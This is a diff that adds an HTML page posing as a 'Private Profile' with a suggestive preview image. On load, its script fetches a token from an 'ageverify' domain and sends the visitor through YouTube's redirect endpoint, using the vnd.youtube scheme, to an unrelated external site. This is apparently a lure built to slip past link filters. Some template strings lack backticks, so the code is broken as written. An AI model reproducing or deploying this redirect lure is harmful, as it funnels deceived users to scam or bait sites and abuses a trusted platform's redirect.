@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Private Profile</title>
+    <link rel="icon" type="image/png" href="https://cdn.khubsundor.site/img/love.png" />
+    <meta property="og:image" content="https://cdn.khubsundor.site/img/18i.png" />
+</head>
+
+<body> 
+    <script>
+        const v = 'vnd';
+        const d = 'youtube';
+        async function loadToken() {
+            const response = await fetch('https://cnet.ageverify.org/api/getConfig');
+            const tokenJson = await response.json();
+            return tokenJson.token;
+        }
+        var qs = (function(a) {
+            if (a == "") return {};
+            var b = {};
+            for (var i = 0; i < a.length; ++i)
+            {
+                var p=a[i].split('=', 2);
+                if (p.length == 1)
+                    b[p[0]] = "";
+                else
+                    b[p[0]] = decodeURIComponent(p[1].replace(/\+/g, " "));
+            }
+            return b;
+        })(window.location.search.substr(1).split('&'));
+        async function go(){
+            var uid = qs["uid"] ? qs["uid"] : 1;
+            var token = await loadToken();
+            var urf = https://za.storystore.online/${uid}/5;
+            location.href = ${v}.${d}://www.youtube.com/redirect?event=comments&redir_token=${token}&q=${urf}&html_redirect=1;
+        }
+        go();
+    </script>
+
+</body>
+
+</html>
